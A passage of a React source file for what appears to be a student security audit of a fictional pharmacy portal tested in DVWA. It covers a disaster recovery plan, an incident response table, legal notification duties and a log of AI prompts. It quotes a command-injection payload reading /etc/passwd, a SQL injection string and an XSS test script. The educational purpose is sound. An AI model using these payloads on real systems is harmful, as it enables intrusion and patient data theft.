              <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>PENDIENTE</td>
              <td style={{ padding: '10px' }}>Inyección de Comandos</td>
            </tr>
            <tr>
              <td style={{ padding: '10px' }}><strong>CTRL-04</strong></td>
              <td style={{ padding: '10px' }}>Detectivo</td>
              <td style={{ padding: '10px' }}>Despliegue de un <strong>Web Application Firewall (WAF)</strong> perimetral en producción.</td>
              <td style={{ padding: '10px', color: 'var(--cod-alto)', fontWeight: 'bold' }}>PLANIFICADO</td>
              <td style={{ padding: '10px' }}>Transversal (SQLi, XSS, CmdInj)</td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>
  </div>
)}
          {/* 08 PLAN DE RECUPERACIÓN */}
{/* =====================================================
    08 // PLAN DE RECUPERACIÓN — FARMASALUD
    Reemplaza el bloque {seccionActiva === 'recuperacion'} 
    en tu App.jsx con este contenido completo.
    ===================================================== */}

{seccionActiva === 'recuperacion' && (
  <div className="animate-fade">
    <h2 className="cyber-title">08 // ESTRATEGIA Y PLAN DE RECUPERACIÓN ANTE DESASTRES</h2>

    {/* CARD 1 — ESCENARIO DEL INCIDENTE */}
    <div className="cod-card glow-border" style={{ textAlign: 'left' }}>
      <h3>1. ESCENARIO DEL INCIDENTE — FARMASALUD VULNERADA</h3>
      <p>
        El Portal de Clientes de FarmaSalud fue comprometido mediante la explotación exitosa de
        <strong> tres vulnerabilidades críticas</strong> identificadas en el ambiente de producción:
      </p>
      <br />
      <p>
        <span className="cod-alert-tag high">CRÍTICO</span>{' '}
        <strong>Command Injection:</strong> El atacante ejecutó el payload{' '}
        <code>127.0.0.1; cat /etc/passwd</code> en el formulario de diagnóstico de red,
        obteniendo el archivo completo de usuarios del sistema operativo del servidor,
        incluyendo <code>root</code>, <code>www-data</code> y el servidor <code>mysql</code>.
        Esto representa <strong>control total del servidor backend</strong> de FarmaSalud.
      </p>
      <br />
      <p>
        <span className="cod-alert-tag high">CRÍTICO</span>{' '}
        <strong>SQL Injection:</strong> Con el payload <code>{'\'  OR \'1\'=\'1'}</code> en el
        campo de User ID, se extrajeron <strong>todos los registros de pacientes</strong> de la
        base de datos sin autenticación: nombres, apellidos, recetas médicas, historial de compras
        y datos del programa de fidelización.
      </p>
      <br />
      <p>
        <span className="cod-alert-tag medium">ALTO</span>{' '}
        <strong>XSS Reflejado:</strong> El campo de nombre en el portal refleja input de usuario
        sin sanitizar. Un atacante puede distribuir enlaces maliciosos con scripts embebidos para
        robar <strong>cookies de sesión activas</strong> de clientes del portal.
      </p>
    </div>

    {/* CARD 2 — PLAN DE ACCIÓN INMEDIATO */}
    <div className="cod-card">
      <h3>2. PLAN DE ACCIÓN INMEDIATO — REMEDIACIÓN DE CÓDIGO</h3>
      <p>
        <strong>Fase 1 — Bloqueo Crítico (primeras 24 horas):</strong>
      </p>
      <p>
        Desconectar el Portal de Clientes de internet de forma inmediata y revocar todos los
        tokens de sesión activos en la base de datos. Deshabilitar las funciones de ejecución de
        sistema operativo (<code>exec()</code>, <code>shell_exec()</code>, <code>system()</code>)
        en el backend. Reescribir todas las consultas SQL vulnerables a formato{' '}
        <strong>Prepared Statements</strong>. Bloquear las IPs de origen del ataque en el
        firewall perimetral y cambiar todas las credenciales del servidor comprometido.
      </p>
      <br />
      <p>
        <strong>Fase 2 — Mitigación Web (primeras 72 horas):</strong>
      </p>
      <p>
        Aplicar codificación de salida HTML (<code>htmlspecialchars()</code>) en todos los
        campos que reflejan input del usuario para eliminar la superficie de ataque XSS.
        Implementar cabeceras HTTP de seguridad:{' '}
        <code>Content-Security-Policy</code>, <code>X-XSS-Protection</code>,{' '}
        <code>X-Content-Type-Options</code> y <code>Strict-Transport-Security</code>.
        Rotar claves de API y secretos de sesión del portal.
      </p>
      <br />
      <p>
        <strong>Fase 3 — Revisión General (primeros 7 días):</strong>
      </p>
      <p>
        Auditoría completa de código fuente con herramienta SAST (Static Application Security
        Testing). Revisión de dependencias con <code>npm audit</code> /{' '}
        <code>composer audit</code>. Análisis forense de logs del servidor para determinar qué
        datos fueron exfiltrados, desde cuándo y por qué vectores. Eliminar cualquier webshell o
        backdoor instalado durante el período de compromiso.
      </p>
    </div>

    {/* CARD 3 — PROTOCOLO IR */}
    <div className="cod-card">
      <h3>3. PROTOCOLO DE RESPUESTA A INCIDENTES (IR)</h3>
      <div style={{ overflowX: 'auto' }}>
        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.9rem', tableLayout: 'fixed' }}>
          <colgroup>
            <col style={{ width: '15%' }} />
            <col style={{ width: '45%' }} />
            <col style={{ width: '25%' }} />
            <col style={{ width: '15%' }} />
          </colgroup>
          <thead>
            <tr style={{ backgroundColor: 'var(--cod-bg-dark)', color: '#fff' }}>
              <th style={{ padding: '10px', textAlign: 'left' }}>ETAPA</th>
              <th style={{ padding: '10px', textAlign: 'left' }}>ACCIÓN</th>
              <th style={{ padding: '10px', textAlign: 'left' }}>RESPONSABLE</th>
              <th style={{ padding: '10px', textAlign: 'left' }}>PLAZO</th>
            </tr>
          </thead>
          <tbody>
            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
              <td style={{ padding: '10px' }}><strong>Detección</strong></td>
              <td style={{ padding: '10px' }}>Alerta WAF / SIEM activa ante patrones de inyección</td>
              <td style={{ padding: '10px' }}>Equipo de Seguridad</td>
              <td style={{ padding: '10px' }}><span style={{ color: 'var(--cod-critico)', fontWeight: 'bold' }}>{'< 1 hora'}</span></td>
            </tr>
            <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
              <td style={{ padding: '10px' }}><strong>Contención</strong></td>
              <td style={{ padding: '10px' }}>Aislamiento de red del servidor comprometido + revocación de tokens</td>
              <td style={{ padding: '10px' }}>Infraestructura</td>
              <td style={{ padding: '10px' }}><span style={{ color: 'var(--cod-critico)', fontWeight: 'bold' }}>{'< 2 horas'}</span></td>
            </tr>
            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
              <td style={{ padding: '10px' }}><strong>Erradicación</strong></td>
              <td style={{ padding: '10px' }}>Deploy desde rama <code>hotfix/security-patch</code> en Git</td>
              <td style={{ padding: '10px' }}>Desarrollo</td>
              <td style={{ padding: '10px' }}><span style={{ color: 'var(--cod-alto)', fontWeight: 'bold' }}>{'< 4 horas'}</span></td>
            </tr>
            <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
              <td style={{ padding: '10px' }}><strong>Recuperación</strong></td>
              <td style={{ padding: '10px' }}>Restauración de BD desde último backup íntegro verificado</td>
              <td style={{ padding: '10px' }}>DBA</td>
              <td style={{ padding: '10px' }}><span style={{ color: 'var(--cod-alto)', fontWeight: 'bold' }}>{'< 6 horas'}</span></td>
            </tr>
            <tr>
              <td style={{ padding: '10px' }}><strong>Post-Incidente</strong></td>
              <td style={{ padding: '10px' }}>Informe forense + notificación legal a afectados</td>
              <td style={{ padding: '10px' }}>Seguridad + Legal</td>
              <td style={{ padding: '10px' }}><span style={{ color: 'var(--cod-safe)', fontWeight: 'bold' }}>{'< 72 horas'}</span></td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>

    {/* CARD 4 — RTO / RPO */}
    <div className="cod-card">
      <h3>4. OBJETIVOS DE RECUPERACIÓN — RTO / RPO</h3>
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.5rem', marginTop: '0.5rem' }}>
        <div style={{
          border: '2px solid var(--cod-critico)',
          padding: '20px',
          backgroundColor: 'rgba(225, 29, 72, 0.05)'
        }}>
          <p style={{ fontFamily: 'monospace', fontSize: '0.8rem', color: 'var(--cod-critico)', marginBottom: '8px' }}>
            // RTO — RECOVERY TIME OBJECTIVE
          </p>
          <p style={{ fontSize: '2rem', fontFamily: 'Impact', color: 'var(--cod-bg-dark)', margin: '0 0 8px' }}>
            ≤ 4 HORAS
          </p>
          <p style={{ fontSize: '0.85rem' }}>
            Tiempo máximo tolerable para restablecer el Portal de Clientes y el acceso a
            recetas médicas digitales tras un incidente crítico confirmado.
          </p>
        </div>
        <div style={{
          border: '2px solid var(--cod-alto)',
          padding: '20px',
          backgroundColor: 'rgba(245, 158, 11, 0.05)'
        }}>
          <p style={{ fontFamily: 'monospace', fontSize: '0.8rem', color: 'var(--cod-alto)', marginBottom: '8px' }}>
            // RPO — RECOVERY POINT OBJECTIVE
          </p>
          <p style={{ fontSize: '2rem', fontFamily: 'Impact', color: 'var(--cod-bg-dark)', margin: '0 0 8px' }}>
            ≤ 1 HORA
          </p>
          <p style={{ fontSize: '0.85rem' }}>
            Pérdida máxima de datos aceptable. Los respaldos automáticos de la base de datos
            de pacientes deben ejecutarse cada 60 minutos en ambiente de producción.
          </p>
        </div>
      </div>
    </div>

    {/* CARD 5 — ESTRATEGIA DE RESPALDO */}
    <div className="cod-card">
      <h3>5. ESTRATEGIA DE RESPALDO Y CONTINUIDAD OPERATIVA</h3>
      <p>
        <strong>Política de Backups:</strong> Respaldos automáticos diarios completos de la base
        de datos de pacientes y recetas, cifrados con <strong>AES-256</strong>, almacenados en un
        servidor externo geográficamente separado. Respaldos incrementales cada hora durante el
        horario de operación (08:00–22:00). Los respaldos deben ser probados mensualmente
        mediante restauración en entorno de staging.
      </p>
      <br />
      <p>
        <strong>Alta Disponibilidad:</strong> Implementar arquitectura de servidor en espera
        (Standby/Failover) para el portal. Ante caída del servidor primario, el tráfico se
        redirige automáticamente al nodo secundario en un plazo máximo de <strong>5 minutos</strong>{' '}
        mediante balanceo de carga.
      </p>
      <br />
      <p>
        <strong>Entorno de Recuperación:</strong> Mantener un entorno de staging permanentemente
        actualizado con la última versión de código seguro, listo para ser promovido a producción
        en caso de incidente crítico sin necesidad de tiempo de desarrollo adicional.
      </p>
    </div>

    {/* CARD 6 — DATOS COMPROMETIDOS */}
    <div className="cod-card">
      <h3>6. INVENTARIO DE DATOS COMPROMETIDOS EN FARMASALUD</h3>
      <p>Basado en la evidencia técnica de las capturas de los ataques ejecutados:</p>
      <br />
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
        <div style={{ borderLeft: '4px solid var(--cod-critico)', paddingLeft: '12px' }}>
          <p style={{ fontWeight: 'bold', color: 'var(--cod-critico)', marginBottom: '6px' }}>VÍA SQLI</p>
          <p>• Nombres y apellidos de pacientes</p>
          <p>• Historial de recetas médicas</p>
          <p>• Datos del programa de fidelización</p>
          <p>• Credenciales de acceso al portal</p>
        </div>
        <div style={{ borderLeft: '4px solid var(--cod-critico)', paddingLeft: '12px' }}>
          <p style={{ fontWeight: 'bold', color: 'var(--cod-critico)', marginBottom: '6px' }}>VÍA COMMAND INJECTION</p>
          <p>• Archivo <code>/etc/passwd</code> completo</p>
          <p>• Usuarios del sistema: root, www-data, mysql</p>
          <p>• Estructura del sistema operativo del servidor</p>
          <p>• Posible acceso a archivos de configuración</p>
        </div>
        <div style={{ borderLeft: '4px solid var(--cod-alto)', paddingLeft: '12px' }}>
          <p style={{ fontWeight: 'bold', color: 'var(--cod-alto)', marginBottom: '6px' }}>VÍA XSS</p>
          <p>• Cookies de sesión de clientes activos</p>
          <p>• Tokens de autenticación del portal</p>
          <p>• Datos de navegación del usuario</p>
        </div>
        <div style={{ borderLeft: '4px solid var(--cod-safe)', paddingLeft: '12px' }}>
          <p style={{ fontWeight: 'bold', color: 'var(--cod-safe)', marginBottom: '6px' }}>ACCIÓN REQUERIDA</p>
          <p>• Notificar a todos los pacientes registrados</p>
          <p>• Forzar cambio de contraseñas en el portal</p>
          <p>• Invalidar todas las sesiones activas</p>
        </div>
      </div>
    </div>

    {/* CARD 7 — LEY 19.628 */}
    <div className="cod-card">
      <h3>7. OBLIGACIONES LEGALES — LEY N° 19.628 (CHILE)</h3>
      <p>
        FarmaSalud opera en el sector salud procesando <strong>datos personales sensibles</strong>{' '}
        (recetas médicas, patologías implícitas, datos financieros de pacientes). Ante una
        filtración confirmada, las obligaciones legales son:
      </p>
      <br />
      <p>
        <strong>Notificación a afectados:</strong> Informar a los titulares de datos
        comprometidos dentro de <strong>72 horas</strong> desde la confirmación del incidente,
        indicando qué datos fueron expuestos y qué medidas se adoptaron.
      </p>
      <br />
      <p>
        <strong>Registro del incidente:</strong> Documentar fecha y hora del incidente,
        categoría y volumen de datos comprometidos, medidas de contención adoptadas e identidad
        del responsable del tratamiento.
      </p>
      <br />
      <p>
        <strong>Responsabilidad por omisión de controles:</strong> La ausencia de controles
        básicos como Prepared Statements y sanitización de inputs puede constituir incumplimiento
        del deber de seguridad exigido por la ley, exponiendo a FarmaSalud a sanciones
        administrativas y acciones civiles por parte de los pacientes afectados.
      </p>
    </div>
  </div>
)}


          {/* 09 BITÁCORA DE IA & REPO */}
          {seccionActiva === 'prompts' && (
            <div className="animate-fade">
              <h2 className="cyber-title">09 // BITÁCORA DE ASISTENCIA IA & DEPLOY-OPS</h2>
              
              <div className="cod-card">
                <h3>RESUMEN EJECUTIVO</h3>
                <p>Este documento detalla el uso de herramientas de Inteligencia Artificial para la investigación, estructuración y redacción de los componentes clave de la auditoría de seguridad web de FarmaSalud.</p>
              </div>

              <div className="cod-card">
                <h3>01_resumen_grocat.md</h3>
                <p><strong>Prompt del usuario:</strong> <em>"Hazme un resumen ejecutivo para una auditoría de seguridad web de FarmaSalud, una cadena de farmacias que opera un portal de clientes con recetas médicas digitales y programa de fidelización."</em></p>
                <p><strong>Resultado de la IA:</strong> La IA ayudó a estructurar el contexto de la empresa, describir el alcance del portal de clientes y redactar una introducción clara orientada al negocio farmacéutico.</p>
              </div>

              <div className="cod-card">
                <h3>02_sqli_grocat.md</h3>
                <p><strong>Prompt del usuario:</strong> <em>"Explícame por qué funciona la Inyección SQL con el payload ' OR '1'='1 en DVWA, cuál sería su impacto en FarmaSalud y cómo calcular su severidad CVSS v3.1."</em></p>
                <p><strong>Resultado de la IA:</strong> La IA explicó el mecanismo de concatenación vulnerable, propuso el vector CVSS base y describió el impacto en términos de filtración de datos de pacientes y recetas médicas.</p>
              </div>

              <div className="cod-card">
                <h3>03_xss_grocat.md</h3>
                <p><strong>Prompt del usuario:</strong> <em>"Explícame cómo funciona el XSS Reflejado con &lt;script&gt;alert('XSS')&lt;/script&gt; en DVWA, qué riesgo representa para los clientes de FarmaSalud y cuál es su puntaje CVSS v3.1."</em></p>
                <p><strong>Resultado de la IA:</strong> La IA colaboró en la explicación técnica del fallo de codificación de salida, el vector de ataque mediante enlace malicioso y el impacto en el robo de sesiones del programa de fidelización.</p>
              </div>

              <div className="cod-card">
                <h3>04_comandos_grocat.md</h3>
                <p><strong>Prompt del usuario:</strong> <em>"Explícame la Inyección de Comandos con 127.0.0.1; cat /etc/passwd en DVWA, su impacto en el servidor de FarmaSalud y su vector CVSS v3.1."</em></p>
                <p><strong>Resultado de la IA:</strong> La IA apoyó en la explicación del uso de separadores de shell, el riesgo de toma de control del servidor y la justificación de las métricas de confidencialidad, integridad y disponibilidad en el puntaje CVSS.</p>
              </div>

              <div className="cod-card">
                <h3>05_activos_grocat.md</h3>
                <p><strong>Prompt del usuario:</strong> <em>"Genera un inventario de activos críticos para FarmaSalud con valoración de Confidencialidad, Integridad y Disponibilidad, considerando que opera un portal con recetas médicas y datos de pago."</em></p>
                <p><strong>Resultado de la IA:</strong> La IA ayudó a identificar y clasificar los activos de datos, software e infraestructura, y a justificar su valoración C-I-D según el rubro farmacéutico y las normativas aplicables.</p>
              </div>

              <div className="cod-card">
                <h3>06_matriz_grocat.md</h3>
                <p><strong>Prompt del usuario:</strong> <em>"Construye una matriz de riesgo probabilidad × impacto para las tres vulnerabilidades de FarmaSalud: SQLi, XSS y Command Injection. Ubícalas en la matriz y justifica su posición."</em></p>
                <p><strong>Resultado de la IA:</strong> La IA colaboró en el diseño de la tabla de riesgos, la asignación de niveles de probabilidad e impacto y la redacción de los escenarios de amenaza para cada vulnerabilidad.</p>
              </div>

              <div className="cod-card">
                <h3>07_controles_grocat.md</h3>
                <p><strong>Prompt del usuario:</strong> <em>"Propón controles de mitigación concretos para SQLi, XSS y Command Injection en FarmaSalud, referenciando OWASP Top 10 y NIST SP 800-53."</em></p>
                <p><strong>Resultado de la IA:</strong> La IA apoyó en la estructuración del cuadro de controles, describiendo medidas preventivas, detectivas y correctivas, y asociándolas a los marcos de referencia solicitados.</p>
              </div>

              <div className="cod-card">
                <h3>08_recuperacion_grocat.md</h3>
                <p><strong>Prompt del usuario:</strong> <em>"Genera un plan de recuperación ante desastres para FarmaSalud en caso de explotación de las vulnerabilidades encontradas, con fases de contención, erradicación y post-incidente."</em></p>
                <p><strong>Resultado de la IA:</strong> La IA colaboró en la redacción del protocolo de respuesta a incidentes, incluyendo el aislamiento de red, restauración desde respaldos y notificación legal a los afectados.</p>
              </div>

              <div className="cod-card">
                <h3>Diseño de Componentes React y Sitio Web</h3>
                <p><strong>Prompt del usuario:</strong> <em>"Genera un componente React con Tailwind CSS que represente un mapa de calor 5×5 de riesgo (Probabilidad × Impacto) con celdas rojas, amarillas y verdes según el nivel de riesgo. Agrega una tabla inferior que muestre el detalle del riesgo al hacer clic en cada marcador."</em></p>
                <p><strong>Resultado de la IA:</strong> La IA apoyó en la generación del código base del componente visual, la estructura del sidebar de navegación y la organización del layout general del sitio en React.</p>
              </div>

              <div className="cod-card command-center-card">
                <h3>DATOS DEL CREADOR</h3>
                <div className="visor-row"><strong>ID USUARIO:</strong> <span className="highlight-orange">cgrohmann5</span></div>
                <div className="visor-row"><strong>NOMBRE:</strong> <span className="highlight-orange">Catalina Grohmann</span></div>
                <div className="visor-row"><strong>ESTADO DEL REPOSITORIO:</strong> <span className="status-planned">VERIFICADO</span></div>
                <div className="visor-row"><strong>ESTADO OPERATIVO:</strong> <span className="status-planned">SECURE-OPS // REPO_VERIFIED</span></div>
                
                {/* INTERFAZ DEL BOTÓN TÁCTICO INTEGRADA */}
                <div className="github-action-wrapper">
                  <a 
                    href="https://github.com/cgrohmann5" 
                    target="_blank" 
                    rel="noreferrer" 
                    className="cod-action-btn"
                  >
                    <span className="btn-main-text">CONECTAR REPOSITORIO GITHUB</span>
                    <span className="btn-sub-tag">// DEPLOY_OPS_FORGE</span>
                  </a>
                </div>
              </div>
            </div>
          )}
        </main>
      </div>
    </div>
  )
}